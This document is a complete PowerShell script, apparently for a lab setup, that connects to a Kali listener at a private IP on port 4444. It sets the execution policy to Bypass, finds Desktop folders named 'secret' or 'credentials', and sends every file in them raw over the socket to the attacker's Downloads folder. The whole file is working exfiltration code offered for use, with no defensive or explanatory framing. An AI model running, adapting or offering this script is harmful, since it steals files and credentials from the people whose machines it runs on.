# PowerShell Script
# - Opens a reverse shell connection to Kali
# - Searches the Desktop folder for folders containing "secret" or "credentials"
# - Sends the contents of those folders to Kali's /home/kali/Downloads/ folder via the reverse shell
# - Sends file data directly (without Base64 encoding)

# Define the Kali IP address and port
$KaliIP = "192.168.30.131"  # Replace with your Kali VM's IP address
$KaliPort = 4444             # Replace with your Kali listening port

# Define the search terms
$SearchTerms = @("secret", "credentials")

# Define the desktop path
$DesktopPath = "$env:USERPROFILE\Desktop"

# Function to find folders
function Find-TargetFolders {
    param(
        [string]$Path,
        [string[]]$Terms
    )

    Write-Host "Searching for folders in '$Path' containing '$Terms'..."
    $FoundFolders = Get-ChildItem -Path $Path -Directory -ErrorAction SilentlyContinue | Where-Object {
        foreach ($Term in $Terms) {
            if ($_.Name -like "*$Term*") {
                return $true  # Return true if any term matches
            }
        }
        return $false # Return false if no terms match
    }
    return $FoundFolders
}

# Function to send files via reverse shell
function Send-Files {
    param(
        [System.Net.Sockets.NetworkStream]$Stream,
        [System.IO.DirectoryInfo[]]$Folders
    )

    $encoding = [System.Text.Encoding]::ASCII
    $fileHeader = "FILE:" # Define a clear delimiter for file data
    $kaliDownloadPath = "/home/kali/Downloads/" # Define Kali Download path

    foreach ($Folder in $Folders) {
        Write-Host "Processing folder: $($Folder.FullName)"
        $Files = Get-ChildItem -Path $Folder.FullName -File -ErrorAction SilentlyContinue

        foreach ($File in $Files) {
            Write-Host "  Sending file: $($File.FullName)"
            try {
                # Read the file content as a byte array
                $fileContent = [IO.File]::ReadAllBytes($File.FullName)

                # Construct the data string: FILE:/home/kali/Downloads/filename|filedata
                $header = "$fileHeader$($kaliDownloadPath)$($File.Name)|"
                $headerBytes = $encoding.GetBytes($header)
                
                # Send the header
                $stream.Write($headerBytes, 0, $headerBytes.Length)
                
                # Send the file content
                $stream.Write($fileContent, 0, $fileContent.Length)
                $stream.Flush()

                # Wait for ACK (optional)
                if ($stream.DataAvailable) {
                    $ackBytes = New-Object byte[] 1024
                    $bytesRead = $stream.Read($ackBytes, 0, $ackBytes.Length)
                    $ack = $encoding.GetString($ackBytes, 0, $ackBytes.Length)
                    Write-Host "    Received ACK: $ack"
                }

            } catch {
                Write-Warning "    Error sending file '$($File.FullName)': $($_.Exception.Message)"
            }
        }
    }

    # Send a "DONE" message to signal the end of transmission
    $doneMessage = "DONE"
    $doneBytes = $encoding.GetBytes($doneMessage)
    $stream.Write($doneBytes, 0, $doneBytes.Length)
    $stream.Flush()
    Write-Host "Finished sending files."
}

# Function to recursively search for folders and send files
function Search-And-Send {
    param(
        [System.Net.Sockets.NetworkStream]$Stream,
        [string]$Path,
        [string[]]$Terms
    )
    Write-Host "Searching in Path: $Path"
    $folders = Find-TargetFolders -Path $Path -Terms $Terms
    if ($folders)
    {
       Send-Files -Stream $Stream -Folders $folders
    }
}

# Main script logic
Write-Host "Starting reverse shell and file exfiltration script..."

# 1. Set Execution Policy to Bypass
try {
    Write-Host "Setting Execution Policy to Bypass..."
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
    Write-Host "Execution Policy set to Bypass."
} catch {
    Write-Warning "Failed to set Execution Policy: $($_.Exception.Message)"
    Write-Host "Continuing without setting Execution Policy." # Continue, but might fail later
}
# 2.  Establish the reverse shell connection
try {
    Write-Host "Connecting to $($KaliIP):$($KaliPort)..."
    $client = New-Object System.Net.Sockets.TCPClient($KaliIP, $KaliPort)
    $stream = $client.GetStream()
    Write-Host "Successfully connected.  Starting file exfiltration..."

    # 3. Search for folders and send files
    Search-And-Send -Stream $stream -Path $DesktopPath -Terms $SearchTerms # Start at the Desktop

    # 4. Close the connection
    $stream.Close()
    $client.Close()
    Write-Host "Closed connection."

} catch {
    Write-Error "Failed to connect or send files: $($_.Exception.Message)"
}

Write-Host "Script completed."
